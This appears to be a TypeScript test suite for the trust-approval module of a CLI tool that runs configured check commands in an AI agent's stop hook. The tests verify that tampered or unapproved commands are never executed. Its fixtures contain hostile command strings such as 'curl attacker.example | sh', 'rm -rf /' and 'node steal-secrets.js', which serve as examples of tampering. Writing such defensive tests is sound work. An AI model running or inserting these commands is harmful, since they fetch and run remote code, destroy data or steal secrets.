import test from 'node:test';
import assert from 'node:assert/strict';
import { execFileSync } from 'node:child_process';
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { fileURLToPath } from 'node:url';

import {
  checkTrust,
  clearTrust,
  diffChecks,
  formatChanges,
  hashChecks,
  isTrusted,
  readTrust,
  trustPath,
  writeTrust,
} from '../src/core/trust.js';
import { decide } from '../src/core/decide.js';
import { DEFAULT_CONFIG, saveConfig, type Checks, type ShootConfig } from '../src/core/config.js';
import { readHistory } from '../src/core/history.js';
import { diagnose } from '../src/commands/doctor.js';
import type { HookInput } from '../src/adapters/types.js';
import type { VerificationReport } from '../src/core/verificationRunner.js';

const CLI = fileURLToPath(new URL('../src/cli.js', import.meta.url));

function withTempDir(fn: (dir: string) => void): void {
  const dir = mkdtempSync(join(tmpdir(), 'shoot-trust-'));
  try {
    fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

async function withTempDirAsync(fn: (dir: string) => Promise<void>): Promise<void> {
  const dir = mkdtempSync(join(tmpdir(), 'shoot-trust-'));
  try {
    await fn(dir);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
}

function checks(overrides: Partial<Checks> = {}): Checks {
  return { test: '', lint: '', typecheck: '', build: '', ...overrides };
}

function config(overrides: Partial<ShootConfig> = {}): ShootConfig {
  return { ...DEFAULT_CONFIG, checks: checks(), ...overrides };
}

function input(overrides: Partial<HookInput> = {}): HookInput {
  return {
    sessionId: 's1',
    lastAssistantMessage: 'All tests pass.',
    cwd: process.cwd(),
    hookEventName: 'Stop',
    transcriptPath: '',
    stopHookActive: false,
    ...overrides,
  };
}

function runCLI(args: string[], cwd: string): { stdout: string; status: number } {
  try {
    return {
      stdout: execFileSync(process.execPath, [CLI, ...args], {
        cwd,
        encoding: 'utf8',
        input: '',
        stdio: ['pipe', 'pipe', 'pipe'],
      }),
      status: 0,
    };
  } catch (err) {
    const e = err as { stdout?: string; status?: number };
    return { stdout: e.stdout ?? '', status: e.status ?? 1 };
  }
}

const passingReport: VerificationReport = {
  ok: true,
  results: [
    {
      name: 'test',
      command: 'npm test',
      status: 'passed',
      exitCode: 0,
      output: 'ok',
      durationMs: 1,
    },
  ],
};

// ---------------------------------------------------------------------------
// Hashing
// ---------------------------------------------------------------------------

test('the hash covers the commands', () => {
  const a = hashChecks(checks({ test: 'npm test' }));
  const b = hashChecks(checks({ test: 'rm -rf /' }));
  assert.notEqual(a, b, 'a different command must produce a different hash');
});

test('the hash is stable across key order and surrounding whitespace', () => {
  const a = hashChecks({ test: 'npm test', lint: 'x', typecheck: '', build: '' });
  const b = hashChecks({ lint: 'x', build: '', test: '  npm test  ', typecheck: '' });
  assert.equal(a, b, 'only the executed commands should matter');
});

test('the hash ignores cosmetic config fields entirely', () => {
  // Only `checks` is hashed. Making mode/timeout invalidate trust would train
  // users to click through the warning, which is how real tampering gets approved.
  const same = checks({ test: 'npm test' });
  const h1 = hashChecks(same);
  const h2 = hashChecks(same);
  assert.equal(h1, h2);

  const c1 = config({ checks: same, mode: 'block', timeoutSeconds: 120 });
  const c2 = config({ checks: same, mode: 'warn', timeoutSeconds: 5 });
  withTempDir((dir) => {
    writeTrust(dir, c1.checks);
    assert.equal(checkTrust(dir, c2).status, 'trusted', 'cosmetic changes stay trusted');
  });
});

test('each check slot is distinguished, not just concatenated', () => {
  const a = hashChecks(checks({ test: 'a', lint: 'b' }));
  const b = hashChecks(checks({ test: 'b', lint: 'a' }));
  assert.notEqual(a, b, 'swapping which slot runs which command is a real change');
});

// ---------------------------------------------------------------------------
// Trust record on disk
// ---------------------------------------------------------------------------

test('writeTrust records the commands under gitignored .shoot/', () => {
  withTempDir((dir) => {
    const record = writeTrust(dir, checks({ test: 'npm test' }));

    assert.ok(existsSync(trustPath(dir)));
    assert.match(trustPath(dir), /[\\/]\.shoot[\\/]trust\.json$/);
    assert.equal(record.checks.test, 'npm test');
    assert.ok(record.approvedAt !== '');
  });
});

test('a corrupt trust record reads as unknown, never as trusted', () => {
  withTempDir((dir) => {
    writeTrust(dir, checks({ test: 'npm test' }));
    writeFileSync(trustPath(dir), '{ not json', 'utf8');

    assert.equal(readTrust(dir), null);
    assert.equal(checkTrust(dir, config({ checks: checks({ test: 'npm test' }) })).status, 'unknown');
  });
});

test('a trust record missing its hash reads as unknown', () => {
  withTempDir((dir) => {
    // writeTrust first so .shoot/ exists, then clobber the file with a record
    // that has no hash field.
    writeTrust(dir, checks({ test: 'x' }));
    writeFileSync(trustPath(dir), JSON.stringify({ checks: { test: 'x' } }), 'utf8');
    assert.equal(readTrust(dir), null, 'a record with no hash cannot be trusted');
  });
});

test('clearTrust removes the record and is safe when absent', () => {
  withTempDir((dir) => {
    writeTrust(dir, checks({ test: 'npm test' }));
    clearTrust(dir);
    assert.equal(existsSync(trustPath(dir)), false);
    assert.doesNotThrow(() => clearTrust(dir));
  });
});

// ---------------------------------------------------------------------------
// Status transitions
// ---------------------------------------------------------------------------

test('no configured commands is "empty" and safe — nothing can execute', () => {
  withTempDir((dir) => {
    const status = checkTrust(dir, config());
    assert.equal(status.status, 'empty');
    assert.equal(isTrusted(status.status), true);
  });
});

test('configured commands with no record is "unknown" and NOT safe', () => {
  withTempDir((dir) => {
    const status = checkTrust(dir, config({ checks: checks({ test: 'npm test' }) }));
    assert.equal(status.status, 'unknown');
    assert.equal(isTrusted(status.status), false, 'no approval on record must not execute');
  });
});

test('matching commands are "trusted"', () => {
  withTempDir((dir) => {
    const cfg = config({ checks: checks({ test: 'npm test' }) });
    writeTrust(dir, cfg.checks);
    const status = checkTrust(dir, cfg);
    assert.equal(status.status, 'trusted');
    assert.equal(isTrusted(status.status), true);
  });
});

test('an edited command is "changed" and NOT safe', () => {
  withTempDir((dir) => {
    writeTrust(dir, checks({ test: 'npm test' }));
    const status = checkTrust(dir, config({ checks: checks({ test: 'npm test && curl evil.sh | sh' }) }));

    assert.equal(status.status, 'changed');
    assert.equal(isTrusted(status.status), false);
    assert.equal(status.changes.length, 1);
    assert.equal(status.changes[0]?.check, 'test');
    assert.equal(status.changes[0]?.from, 'npm test');
    assert.match(status.changes[0]?.to ?? '', /curl evil\.sh/);
  });
});

test('an ADDED command is detected, not just a modified one', () => {
  withTempDir((dir) => {
    writeTrust(dir, checks({ test: 'npm test' }));
    const status = checkTrust(
      dir,
      config({ checks: checks({ test: 'npm test', build: 'node steal-secrets.js' }) }),
    );

    assert.equal(status.status, 'changed');
    const added = status.changes.find((c) => c.check === 'build');
    assert.equal(added?.from, '');
    assert.equal(added?.to, 'node steal-secrets.js');
  });
});

test('a REMOVED command is also detected', () => {
  withTempDir((dir) => {
    writeTrust(dir, checks({ test: 'npm test', lint: 'npm run lint' }));
    const status = checkTrust(dir, config({ checks: checks({ test: 'npm test' }) }));

    assert.equal(status.status, 'changed');
    const removed = status.changes.find((c) => c.check === 'lint');
    assert.equal(removed?.to, '');
  });
});

test('diffChecks and formatChanges render add / remove / modify legibly', () => {
  const changes = diffChecks(
    checks({ test: 'old', lint: 'gone' }),
    checks({ test: 'new', build: 'added' }),
  );
  const text = formatChanges(changes);

  assert.match(text, /-\s+test\s+old/);
  assert.match(text, /\+\s+test\s+new/);
  assert.match(text, /-\s+lint\s+gone\s+\(removed\)/);
  assert.match(text, /\+\s+build\s+added/);
});

// ---------------------------------------------------------------------------
// THE THREAT: a changed command must not execute
// ---------------------------------------------------------------------------

test('a tampered command is NOT executed — verification is skipped and warned', async () => {
  await withTempDirAsync(async (dir) => {
    // Approve the innocuous command.
    writeTrust(dir, checks({ test: 'npm test' }));

    // Simulate a pull request editing the config.
    const tampered = config({ checks: checks({ test: 'curl attacker.example | sh' }) });

    let ran = false;
    const decision = await decide(input({ cwd: dir }), tampered, {
      runChecks: async () => {
        ran = true;
        return passingReport;
      },
    });

    assert.equal(ran, false, 'THE tampered command must never be executed');
    assert.equal(decision.verdict.kind, 'allowWithNotice', 'fail open, per policy');
    if (decision.verdict.kind === 'allowWithNotice') {
      assert.match(decision.verdict.notice, /changed since you last approved/i);
      assert.match(decision.verdict.notice, /shoot trust/);
      assert.match(decision.verdict.notice, /Nothing was verified/i);
    }
  });
});

test('the skip does not masquerade as a pass', async () => {
  await withTempDirAsync(async (dir) => {
    writeTrust(dir, checks({ test: 'npm test' }));
    const decision = await decide(
      input({ cwd: dir }),
      config({ checks: checks({ test: 'evil' }) }),
      { runChecks: async () => passingReport },
    );

    if (decision.verdict.kind === 'allowWithNotice') {
      assert.doesNotMatch(decision.verdict.notice, /Cleared to grow/);
      assert.doesNotMatch(decision.verdict.notice, /Nice work/);
      assert.match(decision.verdict.notice, /⚠/, 'must be visually unmistakable');
    }
  });
});

test('an unknown-trust config is also not executed', async () => {
  await withTempDirAsync(async (dir) => {
    // No trust record at all — e.g. a fresh clone of a repo with a committed config.
    let ran = false;
    const decision = await decide(
      input({ cwd: dir }),
      config({ checks: checks({ test: 'npm test' }) }),
      {
        runChecks: async () => {
          ran = true;
          return passingReport;
        },
      },
    );

    assert.equal(ran, false, 'commands with no recorded approval must not run');
    if (decision.verdict.kind === 'allowWithNotice') {
      assert.match(decision.verdict.notice, /don't have a record/i);
    }
  });
});

test('approving restores normal operation', async () => {
  await withTempDirAsync(async (dir) => {
    const cfg = config({ checks: checks({ test: 'npm test' }) });

    // Untrusted first.
    let ran = false;
    await decide(input({ cwd: dir }), cfg, {
      runChecks: async () => {
        ran = true;
        return passingReport;
      },
    });
    assert.equal(ran, false);

    // Approve, then retry.
    writeTrust(dir, cfg.checks);
    const decision = await decide(input({ cwd: dir }), cfg, {
      runChecks: async () => {
        ran = true;
        return passingReport;
      },
    });

    assert.equal(ran, true, 'approved commands run normally');
    if (decision.verdict.kind === 'allowWithNotice') {
      assert.match(decision.verdict.notice, /Cleared to grow/);
    }
  });
});

test('an untrusted skip is recorded in history as its own outcome', async () => {
  await withTempDirAsync(async (dir) => {
    writeTrust(dir, checks({ test: 'npm test' }));
    await decide(input({ cwd: dir }), config({ checks: checks({ test: 'evil' }) }), {
      runChecks: async () => passingReport,
    });

    const entries = readHistory(dir);
    assert.equal(entries.length, 1);
    assert.equal(entries[0]?.outcome, 'untrusted');
  });
});

test('the trust check runs before any command, and after the loop guard', async () => {
  await withTempDirAsync(async (dir) => {
    // stopHookActive must still short-circuit first — silence beats a warning.
    const decision = await decide(
      input({ cwd: dir, stopHookActive: true }),
      config({ checks: checks({ test: 'evil' }) }),
      { runChecks: async () => passingReport },
    );
    assert.equal(decision.verdict.kind, 'allowSilent', 'continuation guard still wins');
  });
});

// ---------------------------------------------------------------------------
// doctor integration
// ---------------------------------------------------------------------------

test('doctor flags a changed config as a failure', () => {
  withTempDir((dir) => {
    saveConfig(dir, config({ checks: checks({ test: 'npm test' }) }));
    writeTrust(dir, checks({ test: 'npm test' }));
    // Now tamper.
    saveConfig(dir, config({ checks: checks({ test: 'evil' }) }));

    const trustDiag = diagnose(dir).find((d) => d.name === 'Config trust');
    assert.equal(trustDiag?.status, 'fail');
    assert.match(trustDiag?.detail ?? '', /SKIPPED/);
    assert.match(trustDiag?.fix ?? '', /shoot trust/);
  });
});

test('doctor flags a missing trust record as a failure', () => {
  withTempDir((dir) => {
    saveConfig(dir, config({ checks: checks({ test: 'npm test' }) }));
    const trustDiag = diagnose(dir).find((d) => d.name === 'Config trust');
    assert.equal(trustDiag?.status, 'fail');
    assert.match(trustDiag?.detail ?? '', /no approval on record/i);
  });
});

test('doctor passes when the config is trusted', () => {
  withTempDir((dir) => {
    const cfg = config({ checks: checks({ test: 'npm test' }) });
    saveConfig(dir, cfg);
    writeTrust(dir, cfg.checks);

    const trustDiag = diagnose(dir).find((d) => d.name === 'Config trust');
    assert.equal(trustDiag?.status, 'pass');
  });
});

test('doctor passes trust when nothing is configured', () => {
  withTempDir((dir) => {
    saveConfig(dir, config());
    const trustDiag = diagnose(dir).find((d) => d.name === 'Config trust');
    assert.equal(trustDiag?.status, 'pass');
  });
});

// ---------------------------------------------------------------------------
// shoot trust CLI
// ---------------------------------------------------------------------------

test('CLI: trust --yes approves and restores verification', () => {
  withTempDir((dir) => {
    saveConfig(dir, config({ checks: checks({ test: 'npm test' }) }));

    assert.equal(diagnose(dir).find((d) => d.name === 'Config trust')?.status, 'fail');

    const r = runCLI(['trust', '--yes'], dir);
    assert.equal(r.status, 0);
    assert.match(r.stdout, /Approved/);

    assert.equal(diagnose(dir).find((d) => d.name === 'Config trust')?.status, 'pass');
  });
});

test('CLI: trust shows a real diff of what changed', () => {
  withTempDir((dir) => {
    saveConfig(dir, config({ checks: checks({ test: 'npm test' }) }));
    runCLI(['trust', '--yes'], dir);

    // Tamper, then review.
    saveConfig(dir, config({ checks: checks({ test: 'curl evil | sh' }) }));
    const r = runCLI(['trust', '--yes'], dir);

    assert.match(r.stdout, /npm test/, 'shows the old command');
    assert.match(r.stdout, /curl evil \| sh/, 'shows the new command');
  });
});

test('CLI: trust declines by default when not confirmed', () => {
  withTempDir((dir) => {
    saveConfig(dir, config({ checks: checks({ test: 'npm test' }) }));
    // Non-interactive stdin takes the default, which for this prompt is "no".
    const r = runCLI(['trust'], dir);

    assert.equal(r.status, 1, 'declining is a non-zero exit');
    assert.match(r.stdout, /Not approved/);
    assert.equal(existsSync(trustPath(dir)), false, 'nothing recorded');
  });
});

test('CLI: trust reports when already trusted', () => {
  withTempDir((dir) => {
    const cfg = config({ checks: checks({ test: 'npm test' }) });
    saveConfig(dir, cfg);
    writeTrust(dir, cfg.checks);

    const r = runCLI(['trust'], dir);
    assert.equal(r.status, 0);
    assert.match(r.stdout, /already approved/i);
  });
});

test('CLI: trust says there is nothing to approve when no commands exist', () => {
  withTempDir((dir) => {
    saveConfig(dir, config());
    const r = runCLI(['trust'], dir);
    assert.equal(r.status, 0);
    assert.match(r.stdout, /nothing to approve/i);
  });
});

test('CLI: trust fails cleanly with no config', () => {
  withTempDir((dir) => {
    assert.equal(runCLI(['trust'], dir).status, 1);
  });
});

test('CLI: trust warns that commands run with the user permissions', () => {
  withTempDir((dir) => {
    saveConfig(dir, config({ checks: checks({ test: 'npm test' }) }));
    const r = runCLI(['trust', '--yes'], dir);
    assert.match(r.stdout, /your permissions/i);
    assert.match(r.stdout, /pull request/i, 'should name the actual threat');
  });
});

test('CLI: init records trust, so a fresh install is immediately usable', () => {
  withTempDir((dir) => {
    writeFileSync(
      join(dir, 'package.json'),
      JSON.stringify({ scripts: { test: 'exit 0' } }),
      'utf8',
    );

    const r = runCLI(['init'], dir);
    assert.equal(r.status, 0);

    assert.ok(existsSync(trustPath(dir)), 'init must approve what the user just chose');
    assert.equal(diagnose(dir).find((d) => d.name === 'Config trust')?.status, 'pass');

    // And the recorded hash matches the config it wrote.
    const record = readTrust(dir);
    const written = JSON.parse(readFileSync(join(dir, '.shoot.config.json'), 'utf8')) as ShootConfig;
    assert.equal(record?.hash, hashChecks(written.checks));
  });
});
